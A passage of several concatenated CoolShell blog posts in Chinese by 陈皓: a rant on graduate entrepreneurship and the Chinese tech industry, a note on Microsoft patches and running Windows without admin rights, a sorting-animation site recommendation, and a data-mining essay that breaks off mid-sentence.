> **李开复** > ：有关毕业生高科技创业,我的建议：1）创业需要理解趋势、汇集精英、实践经验,因此大学毕业不要主导创业,只能参加创业公司,2）最好远在毕业前就寻找创业公司实习机会（无偿亦可）,因为也许创业并不适合你或你想象那样,3）毕业时若想学习创业,最好到创业公司。到大公司学习能学技术但不够针对性。还有前两天的“移动开发者大会”，然后，又有一个以前的同事和我谈了一下他创业的事以及他的想法，正好又在网上看到罗永浩同学的那个“一个理想者创业的故事”的演讲。还有一些做blog插件的团队希望我能在酷壳上安装一下他们的插件。等等，等等。所以，让我有了这个可以rant的写作情绪。#### 邮件回复请原谅我不能把邮件的原文直接贴出来，因为自从上次我在博客中点名评批了关于敏捷的东西，我明白了，这个世界上，当把你放到公众的高度上，很多以前可以说的话可能都不能说了（虽然我还是在说，说得还比较尖锐，可能本性如此，呵呵）。言归正传，关于这个网友问我的问题，要是我的话，我可能两个都不会选，但是毕竟人家刚毕业，回想一下我当年毕业的时候，不也一样，就像菜市场里的大白菜一样被路过的人挑来捡去的，那有什么选择可言。人都是需要慢慢成长的，刚毕业的这个时候还不能挑挑捡捡的时候，能有两个offer在手作选择已是非常不错了。另外，人家刚毕业，面对北京这个物价奇高的地方，首先要解决的是生活下来，而不是像那些有工作经验的人一样可以追求更高层次的东西，所以，我不应该从我的角度上来思考这个问题，应该从他们的角度，从更现实的角度来思考。于是，我是大概是这么回复他的（加上了很多口水话是为了更像rant）——
* 我对新东西是总是持谨慎的态度，创新工场的刚起步，还需要磨练，而且从现阶段的情况看下来，并不太妙。百度的技术还是很不错的，人家好多年了，用户数量也很大，也有很多积累了，所以还是应该去百度。我之所以这样评价，是因为我始终觉得：1） **创业是不需要助跑的，创业是一种积累到了自然就出现的东西** 。你也许并不那么觉得，但是我觉得创业助跑就像高考的辅导班一样，或是像英语培训班一样，正如老罗所说的，出成绩的本来就是人家先天悟性不错，不行的总是不行，而需要培训的大多数总是有问题的，搞培训的都知道这个道理。退一步讲，就算是这些辅导班让你可以考个高分，但是后面呢？创业是一条很长的路，不是考了高分拿了风投被人宣传就能成的事。2） **刚毕业的学生，要学的不是创业，而** **是开眼界，长见识，这比任何事都重要，因为我们的的视野决定了我们的人生** 。大家也知道我国的教育是什么情况。所以，刚毕业的同学第一件事是把教育和工作差距上的那条大沟给填平了。因此，我觉得大公司有更多的资源和牛人能开阔你的眼界，而不是创新工场里的那些补习班式的团队和项目。而要开眼界应该是去一些成熟的公司，就算要学习创业也应该去那些成型了的创业公司，这是因为，更多的是你要看的那些成功公司的经验和思路。 **你可能知道什么不好，但是你没有见过好的，你将不知道什么是好的** 。你要学习的是成功的东西，而不是失败的东西，这是就我觉得开眼界长见识的最大的价值。
* 关于那些流氓企业（商业公司总是会有些商业手段的，但是使用的是流氓手段的必然是流氓），我们处在的这个社会似乎已经分不清楚什么是流氓手段，什么是商业手段，但是有些公司的做法还是太过份，在如今这样垃圾的社会中居然还能脱颖而出，不得不让人佩服。不过我认为， **我们需要用出世的态度去思考，入世的态度去做事** 。社会是个大染坊，我们走入社会参加工作后，很多人都会迷失在其中，分不清什么是入世什么是出世，所以这需要我们坚持住我们心中那份理想的价值观，这个很难，能坚持下来的也不多。无论这个公司的文化让你有多么的不认同，但只要其好的东西（比如百度的技术还是很不错的），能让你开眼界长见识，那就没有问题。因为不管你去到哪里，那些恶心的事总是会或多或少的存在，这就是中国的社会。所以， **我们去那些无良企业，并不是学他的文化，而是学习他的技术和他们把事做出来的经验，根据鲁迅的拿来主义，重要的去其糟粕，取其精华** 。必竟人家那么大，在技术方面总是有可取之处的，学成后离开他就好了。我们的教育把我们洗脑洗成了只有是和非的价值观，要么就是大好，要么就是大恶。所以，我们的感情要么就是爱，要么就是恨。没有必要，社会是多元的，多维的，这需要我们要学会分开看问题。 **对于刚毕业的学生，还是多去学学一些实实在在的技术，百度是有技术的** 。
所以，对于李开复的微博，我认为，毕业去创业并不好。去学习创业也要看看是去哪里？很多朋友都觉得毕业就算学完了，这就错了。大学毕业表示真正的学习才刚刚开始，我比较保守，我觉得走出学校，还需要5-10年的社会学习和积累。我经历告诉我，大多数人是浮燥的，急功近利的，好大喜功的，无论是投资人，创业者，还是打工者。真正踏踏实实学习和努力的人很少。我想说是，不要被人两三句话就说得激动万分，不知道自己是谁了， **你一开始没有吃好的饭，你总有一天得回来吃的** 。#### 创业 和 事业我上上周未和我一个朋友聊了一下他的创业的想法和经历。他和我说他见到这个国外投资人曾投过MySQL，当这个投资人听到他的项目的时候，很惊讶，因为，投资人来中国听到几乎全部都是“业务型的项目”，而从他这里第一次听到“技术型的项目”。投资人非常感兴趣，于是就聊了一会就决定投他的项目了。我在想，如果我们假设有一天MongoDB的创始人在中国找投资人，对中国的投资人说，我有一个很NB的想法，我要做一个开源的非关系型的数据库，可以解决大规模数据量的快速水平扩展的问题，并可以为现在互联网上的数据处理增加巨大的性能价值， 我不知道中国的投资人对这样的项目会不会感兴趣？我看悬。我这里不是说“业务型的项目”不好，我只是想说，在一个浮燥的环境里，几乎没人会关注这些“技术型的项目”。“业务型的项目”外表很华丽，更能打动人，可以让人看到“钱途”，所以，也就没人会关心那些可能改变世界的长期性的“技术型的项目”。多可悲的社会。
其实， **创业就是开创事业** 。重点是事业，不是开个公司，也不是挣钱， **公司和挣钱是你事业的副产品** 。 **事业是我们的理想，是我们对自己人生价值的一种诉求** 。我个人认为，只有上升上事业的层面上来，才能算得上是创业。如果你只是想开个公司，接两个项目做做，挣点钱，我觉得那就是在浪费时间浪费生命，还不如去跟着一个不错的公司打工，除非你是想以一种曲线的方式达到你的人生理想目标。 **你的公司至少应该要去改善或是颠覆点什么，如果还有价值观的输出，那就更完美了** 。总之一句话， **别把自己给卖了** 。就算是在公司里打工，也应该有这份理想主义。我一直和我的团队说——我们每一个人今天不愁找工作，外面也有很多东西在诱惑着我们。对于我们来说，我们今天在Amazon这个高速增涨并很踏实的公司里，我们应该把在公司里打工升华到事业的层面上来。看看，Amazon是怎么一点一点地、扎扎实实地、有条不紊地、通过技术分析用户和市场来改变世界的，想想自己在Amazon公司里可以影响些什么，可以领导些什么，可以跟着Amazon去为这个世界改变些什么。当你有这样的心态和方式，积累到了，你就能去改变些什么，那时，你要出去创业也就成了一件水到渠成的事。
看看今天如此浮燥的社会，我不知道人们怎么了。 **中国的很多的创业公司好像都只是为了上市挣钱，而国外更多的公司是为了上市后能改变世界或颠覆传统，这其中有多大的差距啊** 。每当看到中国有那么多的CopyCat（或叫C2C），而国外有那么多的创新，我实在无法为国人感到骄傲。他们甚至还为他们的抄袭找到很多理由，比如，有人说Linux 抄 Unix还不是抄，Windows还不是抄MacOS，OpenOffice抄MS Office，等等。我同意很多好的创意会被人Copy去，这本来也没有什么。只是我想说的是：1）判断一个事有没有抄了另一个事。我觉得不应该看其表面特征像不像，应该看其有没有颠覆性。比如Linux对Unix的颠覆。PC对苹果电脑的颠覆（Windows属于PC机颠覆时代的产物，让PC机更具颠覆性。 同样，Linux的开始也是先上x86）。 **就算是表面上复制了你，但是用另一种模式其改变了世界，颠覆了传统，创造了价值，这就不是抄袭** 。而中国的很多团队呢，还有那个山寨大王的公司，他们只不过是在做简单的复制，Copy而已，根本谈不上什么颠覆，不知道这个山寨公司怎么想的？钱没处花了吗？不知道这个世界上还有更多的东西更有价值吗？另外，举个例子，新浪微博可能是一个比较不错的复制，我暂时不说其在技术处理信息的回复上和Twitter巨大的差异（可以看看这篇文章），但是我们可以看到它还是有很多不错的功能（可惜的是新浪的名人路线让其永远不能理解什么是互联网的内涵，而很多人也迷失在这种浮华和虚荣之中）。而其它什么饭否，知乎，等等就是纯粹为了山寨了。如果我们不能颠覆一个产品，我们至少要想着去颠覆或是改善其某个或是几个功能吧。单纯的复制，走不长远，因为你无法理解其内涵。
2）我们能不能问问我们自己。只是简单地去复制一个别人的想法，而没有经过自己的分析和考虑，这样的创业有意思吗？总有一些东西要不同吧，总不能靠我们政府帮你墙了你的复制源吧。这样的人生有什么意思吗？还是那句话—— **别把自己给卖了** 。我有一些同学，都在给中国的国有银行做项目，做了十多年了，还是和十年前几乎一个样。项目就是打单，加班，赶工，需求拼命变更，被甲方和SB领导蹂躏，等等，等等。我在想，一个公司，十多年了，还是老样子，连最基本的商业运作和项目管理还是十年前老样子，哎。十年，在IT行业，这十年是完全翻天覆地的变化，人们的生活方式和传统都受到了前所未有的改变和颠覆。然而，我们很多这样的公司，这十年，他们并没有改变什么，连自己都没有改变。银行里的系统还是向十年前那样，还是用十年前的方式和银行打交道。这些公司，他们从未想过要去改变或是颠覆点什么，就算想过，也就坚持了一两年。 **我们中国的企业，大多数是没有理想，没有抱负的企业** 。这样的例子有很多很多。* 看看csdn，it-pub, 中文infoQ等一系例的技术论坛。尤其是 CSDN，也有十来年的历史了吧。从来没有想过怎么过提高信息质量，论坛和博客系统有段时间那叫一个难用啊。充斥着各种各样的广告和产商的软文和活动。看看这个微博（ **注** ：这个微博已经删除了，这个微博是CSDN的老总范凯不知道怎么在论坛时放广告了，因为全都放满了），你就知道为什么这些论坛干了那么长时间也无法成为像StackOverflow或是Quora这样的水平。再说说InfoQ中文站，完全就是敏捷和TW的喉舌，主编里面有半数以上是TW公司的，上面的文章就像看新华网，人民网一样失去了媒体应有的客观性。而且那里的语言栏目没有C/C++语言，你能想像这些坑爹的编辑是怎么想的吗？所以，他们也无法成为像CNet, TechCrunch，或是像Dr. Dobb’s。因为那里是产商的广告战场，而不是技术人员的论坛。他们的目光短浅之处就在于， **他们并没有明白真正让论坛和社区有人气有权威的是技术人员，而不是这些为了销售的产商。难道不想成为最权威的技术网站吗？难道不知道成为最权威的技术网站后面所蕴藏的商机会比今天这种模式要大N倍吗** ？
* 淘宝也一样（也许马云明白，下面的人不明白）。前段时间我在淘宝商城里买了一个假货。于是我找在线客服投诉，在线客服不管，让我打电话去杭州（这么大个公司连个800的客服电话都没有，shit!），我只好打到杭州，经过若干个占线的经历后（淘宝的call center真是弱爆了），杭州的客服告诉我，让我在线点“让淘宝客服介入”，我说，我打电话来淘宝就是让你介入的，但我却被告之要求介入的唯一方法必需是在网站上点相应的按钮。偶滴神啊，哪个脑子进水的经理设计的这客服流程啊（这不是和老罗那个短片里星巴克的“中杯”的段子不一样脑残吗）。好吧，我还没疯，我去网站点了，结果3-4个月，淘宝的客服根本就没找我，连个邮件都没发。可见， **淘宝几乎是和商家一伙的，而不是站在买家一边的** 。淘宝的目光短浅之处就在于， **他们并没有明白真正付钱的是买家，而不是那些商户。如果买家满意了，淘宝及其商户才能赚到钱。这么浅显的道理不懂吗？也许，淘宝知道他现在平台上的这些商户让他根本不敢面对买家** （另外，关于淘宝的技术，我觉得有点两极分化，后台看似很强，但是前台用户的管理页面那个恶心啊，还要整些ActiveX插件，搞得只支持IE 和 Win，仅支持IE也罢了（最近发现其支持chrome了），有时候下单的时候看不见提交按钮，联系在线客服，他让我：换别的浏览器，如果不行，就清空所有的缓存，再不行就重装浏览器，WTF，你们开发人员有没有搞错啊）
* 百度和360就更SB了。有技术，有资金，有用户，有市场，还是上市公司，也积累了那么多年，也有很不错的产品和功能，但是就一定要去走流氓的路线，脑子透逗了吧。 **这不是目光短浅的问题了，这是人品和智商的问题了** 。难道百度不觉得有一个权威公正的搜索排名，会比恶意地竞价排名能挣更多的钱吗？难道百度不明白保护知识产权也能挣更多的钱吗？因为，当你让一个生态环境良性循环起来，你会发现，作为生态引擎的你会让整个生态系统更加依赖你，追捧你，而这个良性的生态系统会让你不由自主地进化和变得越来越强。对于360我就不多说了，你懂的，你要是不懂，那也不是目光短浅的问题了，也是智商的问题了。所以，他们能走到最高点也就是这样了。不想去创新，不想去改变传统方式，不去分析和关注用户，只为了挣钱挣钱，眼光就是如此短浅，所以也就成了钱和投资方的奴隶，于是也就变得愚蠢和迟钝了。 **真是Stay hungry, Stay foolish啊，hungry到饥不择食，foolish到自掘坟墓** 。当然，你一定会说，对这些大公司来说是这样的，但是对于创业的小团队来说，我说的这些东西太大了，什么改变世界，什么颠覆传统，这个命题太大了。你甚至可以举出像“超级玛丽”这样的经典游戏，或是像“开心农场”这样打发时间的游戏，其并没有改变世界，也没有颠覆传统，但人家还是很成功的。没错，有些时候，我们创业并不需要去改变什么，只需要去满足别人些什么（满足他人的虚荣心的微博，让人打发时间的游戏）。对于我们大多数人来说，能做一个软件产品有很多用户在用就很满足了。能让很多用户来用你的东西，说白了还是在改变什么，或是在颠覆点什么。你没有发现，满足人们的虚荣心，让人打发时间也不是件简单的事，虽然这些只是玩一阵子就不玩的东西，但是，不可否认电子游戏界的创新以及其方式的改变也是相当猛的。
好吧，我再圆一圆我的话—— **创业总是要去改变点什么，颠覆点什么，或是满足点人们什么，解决点什么，而只有想要去创建某种规则，建立某种秩序，并有价值观输出的团队，才有可能成为真正的事业** 。在这个社会里，很多人并不明白这个道理，就算是明白，也不会这么行事。我有一个以前的同事，来中国Amazon面试Kindle App团队的部门经理，过了，也给offer了。但是不想来，为什么？因为他觉得现在他在管一个几十人的团队。而Amazon的这个团队太小了，只有不到十人，而且职位的title不满意。这就是我前面说的，眼界不够开阔的问题。小团队干大事情这不挺好的吗？我们很多人都把眼光放在了那些虚的地方，比如部门大不大，位置高不高，薪水诱不诱人，但却没有看到要做这个事有多大。可惜啊。上新浪微博看看，全是什么XXCTO，XXCEO，XX创始人，XX总监，XX高级主管……title要多牛有多牛，但可惜的是也就是个名称罢了，我花10元钱也可以为自己印一盒要有多牛就有多牛的名片。那些用人经理和猎头只会问，你职位是什么啊？你管多少人啊？好像是个高级主管，管上几十上百人就很牛似的。可是，你用这个title和这些人做了什么事啊？这就像我质问Thoughtworks和敏捷人士们一样，你们用这些所谓NB的东西做了什么大事啊？！（注意：我不是说，挣多少钱和职位发展不重要，我只是说，相对于做什么事，怎么做事来说，这些都是其次重要的，只要做的事靠谱，报酬和职业都会得到的）
好吧，让我再回到创业的话题上来， **有一本书叫“Rework”，想创业的朋友可以好好读一读**。“保持 小的公司规模，你不需要加班，你没有必要耗尽你一生的积蓄，承担财务风险。你可以一边继续日常工作，一边开始创业，这样随时都能有现金满足需要。你甚至不需要办公室。现在可以在家工作，和从未见面离你千里之外的人合作…… ” 这是一本让你可以去思考的书，远比那些名人们的微博有价值地多得多。 **不要跟随大流，保持住内心的理想，Think it Big, Make it Different** 。我没有能力去诠释人活着是为了什么。但就我而言，我认为应该在自己那短暂的人生内能去多经历更多一些有意义事情，能多做一些更有意义的事情，人生太短了，人太容易变了，时间，精力和人性都经不起折腾。只要做的事有意义，跟着别人一起去开创事业未尝不可，开公司又不是什么时尚。所以，如果你是一个做事的人，我觉得，不要去盲目地创业，那是在浪费时间，潜下心来，观察，思考，尝试，积累，就像一只在非洲草原上匍匐前缓缓逼进猎物的狮子那样有耐心。 **把自己当成一个沉着稳重猎手，而不是战场上的炮灰** 。#### 移动互联网我不知道大家怎么看这个名词的。这是个当今巨火无比的词儿。有人跟我说过一个段子，某中国大公司的研究所的某某研究员是做出了这样的口沫横飞的定义——“移动互联网绝对是个了不起的东西，因为互联网是移动互联网的子集，因为静止是相对的，移动是绝对的，所以移动互联网必然是未来的一切……”。领导的讲话真是没得说，你我都不可能说出来这样的话。
在我眼中，互联网才是核心，移动只不过是互联网的补充，只不过是为了让互联网有更好的体验。今天，全世界都打鸡血似地开发移动应用，我仿佛看到当年Windows平台出现的时候，大家都在Windows上写一些小软件一样。不可否认其中是有一些很不错的应用，也不可否认苹果的App Store让这些“软件个体户们”有了更好的创作平台，而软件质量也显著提高。但是更多的应用都会像Windows平台上的那些小软件一样，必然会很快被淹没在历史大潮之中。没有后面互联网和实际业务的强力支持，移动上的应用也就是一些小打小闹的东西。今天移动互联网的热，就像10年前.com的热一样，我看到移动互联网中像当年.com那样大量的泡沫。我看到各种创业团队和投资一涌而上，而我们都知道， **当潮水退却的时候，就可以看到哪些人在裸泳了** 。今天的移动设备和当年的PC机何其相似，真正制定规则的人都是那些在制造移动设备及其操作系统的公司。当年在Windows上有很多不错的共享软件，什么foxmail，netants，cuteftp，…… 我记得当时foxmail被以2000万收购，但是今天也就这样了，邮件都都在Web或是移动端收了。我相信今天在这些在移动设备上开发应用的创业团队，很有可能也会在5到10年之后面临着相同的尴尬（可能会更短）。我倒不是说这样的小软件没意思，我只是想说，这样的小软件的开发完全没有必要成立公司，要成立公司，就应该要干得比这个事要大。不是吗？难道你不想创建一个能比自己寿命还长的事业和公司吗？移动互联网上的很多小应用，更像是大学里学生们开发着玩的一些软件玩具罢了。
移动互联网上很多app感觉特别无聊，比如foursquare, 街旁之类的东西，虽然我实在不能理解这样的东西为何流行，但我想起了我6年前（2005年），当blog出现的时候，我在MSN的BLOG上记录过自己的一些粗糙的想法（现在搬到了新浪Blog）。当时我认为， **互联网的进化和人类社会的进化很相似，web1.0 到 web 2.0，就是从“自由”到“自我”的一个过程。** 今天，我们看到了 “自我”这个过程的各种各样的演绎，也许，像这种地理位置签到的玩意儿同样满足了人们那种“自我”的渴望。不过，我们都可以看到今天互联网上“自我”的泛滥，人们在网上晒各种各样自己的东西，在豆瓣上展示自己读过的书，看过的电影，在微博上晒自己的旅行照片，生活点滴，自己的车子房子老婆孩子，公司，职位，简历，加V，衣食住行，吃喝拉撒，等等一切可以拿出来炫耀的东西，包括自己的地理位置。我想到了“自我”，但我万万没有想到自我的东西里还包括自己的位置。 **这些不创造任何价值的自我的东西终将是过眼云烟，昙花一现** 。 **我们都得问问自己这个问题——我们有没有在创造价值** ？！（也许这个话说得有些绝对了，对于中国人来说，这是我们的culture啊。另外，我意识虚荣和炫耀并不产生价值是错的一一GMM的事给了我一记漂亮的耳光。试想，当今这个社会，如果所有的二奶都来炫耀谁包养了她，官员们都能签到他们出入的位置，那么还是能创造很多价值的。滑稽吧）
今天，我大胆预测一下未来互联网的走势，只有了解历史，我们才能看清未来。* **互联网的精髓是自由和分享** 。这个东西以前是这样，现在也是这样，未来还是这样。就算是我们正在经历那些反人类的东西。但这个精神和趋势必然是无法阻挡的。我们在网上没有边界地分享我们的数字信息，或公开，或私密，无论是我的发邮件，写博客，织微博，还是看视频，听音乐，写评论。都是自由和分享的体现。移动互联网会把这个事体现到极致。* **互联网的本质是信息组织** 。关于信息，以前是ICP发布信息，现在是ICP feed信息(订阅)，大众参与组织信息。但是都会有一个问题，那就是信息太多，等于没有信息。搜索引擎的出现部分解决了这一问题。但没有解决彻底。因为搜索出来的东西还是太多，而且是搜索引擎的单一标准，而不是个体差异和喜好的标准。所以， **我觉得未来的信息必然要走个性化的路。搜索引擎或是别的平台（如豆瓣，电子商务等）会学习用户的习惯和喜好，然后根据用户的喜好出现不同的结果。这就是所谓的推荐** ！ **未来必然是推荐的时代** 。所以，对于移动平台，我觉得最有价值的就是这些事情：1） **阅读** （如：kindle，新闻，图书，订阅等），2） **分享和交流** （如：facetime，iMessage，微信，米聊，电邮等等），3） **电子商务** （如：机票酒店餐饮购物），4） **推荐** （目前这一块还是比较空的）。注意，我们需要清楚地认识到，其中的分享和交流是对传统电话和短信的延续，并不是取代！有些时候，本来直接打个电话发个短信就解决了的事，我们还要让用户上我们的平台，这就没有意义了。
哦，你会问我，云计算在哪里？云嘛，在天上漂着呢，尤其是中国的各种云。我不知道你还记不记得前几年的“网格计算”？现在真的成浮云了。不要去追随着那些媒体们热捧热炒的东西， **中国的科技媒体们一来只会跟产商，二来他们哪有你懂技术懂产品啊** 。所以，不要被他们吹晕了，不知道自己该干什么了。还是想一想，你要解决什么问题，关注这些名词或代号没有意义。#### 结尾最后，我要说明一下，本文是我思考了十天左右的文章，不存在喝多了，也不存在凌晨写作头脑不清的问题，也不存在本来要把一篇给小范围传播的文章给大家看。对于我在文中批评的那些公司，我希望他们能把我的这些rant当成一种建议和鞭策，当然，你们需要适应我调侃和尖锐的语气。千万不要学那些敏感人士，或是黑我的blog，或是骂人，因为这样只会让你们看上去更为难堪。最后注明一下版权， **本文由陈皓原创发表，你可以任意传载，但必需在明显位置注明作者和出处，而且不能用于任何商业用途** 。# 微软的安全补丁分析作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn截止至2009年底，大约有90%的微软安全补丁是把管理员权限给disable了。根据 BeyondTrust的报告，到今年3月分，Windows 7 有57%的安全补丁是以移除管理员权限作为解决方法的，相比较而言，Windows 2000 是 53%，Windows XP 是 62%，Windows Server 2003 是 55%，Windows Vista 是 54% 以及 Windows Server 2008 是 53%，而最牛的要算是 —— 100% 的 Microsoft Office 和 94% Internet Explorer （其中100% 的 IE8 ）的安全补丁是移除管理员权限。
这对于某些公司的IT部门来说是个好消息，因为这些公司的IT部门通常是不会让公司的员工有本机的管理员权限的，根据微软大量的安全补丁是移除某些管理员权限的这一特性，这意味着对于本机只有一般用户权限IT管理，将会防住很大一部份的恶意攻击。Paul Cooke, Windows Client Enterprise Security主管说：“我们相信，如果你只是用一般用户来操作Windows的话，这会是一种很好的方式”。而这一提法，相对于Unix的尽可能的不用root用户操作系统这一观点，整整落后了几十年，Windows的用户很习惯于在Administrator下操作系统，这样，一旦中招，任何程序都以系统管理员的权限运行，所以结果也是毁灭性的。这样操作电脑的方式对于Unix的用户来说简直是不可想像的，因为在Unix下，99%的情况下，操作者都不会使用管理员的账号。还记得以前和朋友的一段对话：朋友：“为什么Windows下很容易中病毒，Unix/Linux下却不常见？杀毒软件在Windows下是必备的，但还是很容易中招，而Unix/Linux却可以祼奔。”陈皓：“那是因为大家都用Windows的Administrator用户操作电脑，而且文件系统都没有权限设置。不像Unix/Linux，没人总是用root操作电脑，而且，所有的文件和目限都有权限。所以，Windows下，一中病毒，病毒就会以管理员的权限运行，不但破坏你的系统甚至干掉你的杀毒软件。而Unix/Linux下，就算中毒，干掉的也是当前用户下的文件，对于系统文件和系统进程来说，不会有任何问题。”
朋友：“那么在Windows下，如何和Unix/Liunx一样使用？”陈皓：“首先，尽量不要使用Adminstrator用户，使用User用户操作电脑。并且把文件系统格式化成NTFS，这样才能设置上权限。把C盘的根目录，%Windows%以及%System%目录，注册表的关键位置（服务、启动等），都设置上只有Administrator可写，User只读。这样一来，就算是中毒，病毒最多改写当关用户文件，其根本无法操作C盘根目录和Windows%以及%System%目录以及注册表的关键位置，还有IE的插件等（这些地方都是病毒最爱去的地方），中毒后不会对系统造成伤害。在这种情况下，你就算没有杀毒软件祼奔也没有问题”朋友：“嗯，听起来不错。不过这样整是不是太麻烦了，特别是要装一些软件什么的。”陈皓：“是的，没错。按道理来说，各个用户的软件应该是装在其用户的目录和环境下，而不应该装在系统的目录下，Unix/Liunx就是这么做的，但是Windows并没有提供这样的方式，很多软件都要去Adminstrator下安装，所以，在系统上装上一些恶意插件，流氓软件也就很正常了。没办法，这就是Windows和Unix/Liunx的差别了，Windows出生的时候就是单用户的，Unix/Liunx则是多用户的，这是Windows先天设计的缺陷，所以，今天这样的局面也是理所当然的。”
上面的这段对话，也许有助于你了解Windows，安全等方面的东西。下面，让我们再来用一组数据结束本文。总体来说，去年一年中64%的所有的微软安全补丁把管理员权限给移除了。如果你只考虑Critical级别的安全补丁，那么有点到80%补丁是移除管理员权限，如果只考虑远程攻击方面的，那么这个比率是84% 。相关的报道请查看如下文章：* 90% of Critical Microsoft Windows 7 Vulnerabilities are Mitigated by Eliminating Admin Rights (beyondtrust.com) * Report: Windows 7 holes eased by axing admin rights (news.cnet.com)（全文完）# 一个排序算法比较的网站作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这个网站是一个非常丰富的排序算法的网站。#### Sorting Algorithm Animations这是一个非常不错的排序算法的网站，当你打开这个网站的时候，请不要因为看到很多个图片的大红叉而鄙视它。你先点击网页上方的Problem Size，选择一个尺寸，20，30，40还是50，都行，于是你就可以看到下面整个大表中有图片显示出来了。如下所示：
!sort其中，* **列。** 是代表每一个排序算法，有“插入”“选择”“冒泡”“Shell”，“合并Merge”，“堆排序”，“快速排序”，“快速3排序”。单击每个一算法的链接，你可以看到这个算法的详细解释，其中包括，算法的伪代码，算法的复杂度，相关的讨论，重点，以及该算法的相关参考文档。   * **行。** 是不同的数据样本，第一个是“随机样本”，第二个是“几乎排好序的样本”，第三个是“最差的样本（反序）”，第四个是“有一些相同项的样本”。这些样本在不同的算法上都会有不同的表现。   * **单元格** 。每个单元格都是一个图片。简单的用鼠标单击一下每个图片，可以动画地演示算法整个过程。其中两个小红箭头表示了正在需要“交换顺序的数据”。这个网站，还是做得很8错的。希望大家喜欢。# 数据的游戏：冰与火作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我对数据挖掘和机器学习是新手，从去年7月份在Amazon才开始接触，而且还是因为工作需要被动接触的，以前都没有接触过，做的是需求预测机器学习相关的。后来，到了淘宝后，自己凭兴趣主动地做了几个月的和用户地址相关数据挖掘上的工作，有一些浅薄的心得。下面这篇文章主要是我做为一个新人仅从事数据方面技术不到10个月的一些心得，也许对你有用，也许很傻，不管怎么样，欢迎指教和讨论。
另外，注明一下，这篇文章的标题模仿了一个美剧《权力的游戏：冰与火之歌》。在数据的世界里，我们看到了很多很牛，很强大也很有趣的案例。但是， **数据就像一个王座一样，像征着一种权力和征服，但登上去的路途一样令人胆颤** 。目录* 数据挖掘中的三种角色   * 数据的质量     * 案例一：数据的标准     * 案例二：数据的准确   * 数据的业务场景   * 数据的分析结果   * 总结#### 数据挖掘中的三种角色在Amazon里从事机器学习的工作时，我注意到了Amazon玩数据的三种角色。* **Data Analyzer：数据分析员** 。这类人的人主要是分析数据的，从数据中找到一些规则，并且为了数据模型的找不同场景的Training Data。另外，这些人也是把一些脏数据洗干净的的人。* **Research Scientist：研究科学家** 。这种角色主要是根据不同的需求来建立数据模型的。他们把自己戏称为不近人间烟火的奇异性物种，就像《生活大爆炸》里的 那个Sheldon一样。这些人基本上玩的是数据上的科学* **Software Developer ：软件开发工程师** 。主要是把 Scientist 建立的数据模型给实现出来，交给Data Analyzer去玩。这些人通常更懂的各种机器学习的算法。
我相信其它公司的做数据挖掘或是机器学习的也就这三种工作，或者说这三种人，对于我来说，* **最有技术含量的是 Scientist** ，因为数据建模和抽取最有意义的向量，以及选取不同的方法都是这类人来决定的。这类人，我觉得在国内是找不到的。* **最苦逼，也最累，但也最重要的是Data Analyzer** ，他们的活也是这三个角色中最最最重要的（注意：我用了三个最）。因为，无论你的模型你的算法再怎么牛，在一堆烂数据上也只能干出一堆垃圾的活来。正所谓：Garbage In, Garbage Out ！但是这个活是最脏最累的活，也是让人最容易退缩的活。* **最没技术含量的是Software Developer** 。现在国内很多玩数据的都以为算法最重要，并且，很多技术人员都在研究机器学习的算法。错了，最重要的是上面两个人，一个是苦逼地洗数据的Data Analyzer，另一个是真正懂得数据建模的Scientist！而像什么K-Means，K Nearest Neighbor，或是别的什么贝叶斯、回归、决策树、随机森林等这些玩法，都很成熟了，而且又不是人工智能，说白了，这些算法在机器学习和数据挖掘中，似乎就像Quick Sort之类的算法在软件设计中基本没什么技术含量。当然，我不是说算法不重要，我只想说这些算法在整个数据处理中是最不重要的。
#### 数据的质量**目前所流行的Buzz Word——大数据是相当误导人的。在我眼中， 数据不分大小，只分好坏。**在处理数据的过程中，我第一个感受最大的就是数据质量。下面我分几个案例来说明：##### 案例一：数据的标准在Amazon里，所有的商品都有一个唯一的ID，叫ASIN——Amazon Single Identify Number，这个ID是用来标识商品的唯一性的（来自于条形码）。也就是说，无论是你把商品描述成什么样，只要ASIN一样，这就是完完全全一模一样的商品。这样，就不像淘宝一样，当你搜索一个iPhone，你会出现一堆各种各样的iPhone，有的叫“超值iPhone”，有的叫“苹果iPhone”，有的叫“智能手机iPhone”，有的叫“iPhone 白色/黑色”……，这些同一个商品不同的描述是商家为了吸引用户。但是带来的问题有两点：1） **用户体验不好** 。以商品为中心的业务模型，对于消费者来说，体验明显好于以商家为中心的业务模型。2） **只要你不能正确读懂（识别）数据，你后面的什么算法，什么模型统统没用** 。所以，只要你玩数据，你就会发现， **如果数据的标准没有建立起来，干什么都没用。数据标准是数据质量的第一道关卡** ，没这个玩意，你就什么也别玩了。所谓数据的标准，为数据做唯一标识只是其中最最基础的一步，数据的标准还单单只是这个， **更重要的是把数据的标准抽象成数学向量，没有数学向量，后面也无法挖掘** 。
所以，你会看到， **洗数据的大量的工作就是在把杂乱无章的数据归并聚合，这就是在建立数据标准。这里面绝对少不了人肉的工作** 。无非就是：* 聪明的人在数据产生之前就定义好标准，并在数据产生之时就在干数据清洗的工作。* 一般的人是在数据产生并大量堆积之后，才来干这个事。另外，说一下Amazon的ASIN，这个事从十多年前就开始了，我在Amazon的内网里看到的资料并没有说为什么搞了个这样一个ID，我倒觉得这并不是因为Amazon因为玩数据发现必需建议个商品ID，也许因为Amazon的业务模型就是设计成以“商品为中心”的。今天，这个ASIN依然有很多很多的问题，ASIN一样不能完全保证商品就是一样的，ASIN不一样也不代表商品不一样，不过90%以上的商品是保证的。Amazon有专门的团队Category Team，里面有很多业务人员天天都在拼命地在对ASIN的数据进行更正。##### 案例二：数据的准确用户地址是我从事过数据分析的另一个事情。我还记得当时看到那数以亿计的用户地址的数据的那种兴奋。但是随后我就兴奋不起来了。因为地址是用户自己填写的，这里面有很多的坑，都不是很容易做的。第一个是假/错地址，因为有的商家作弊或是用户做测试。所以地址是错的，
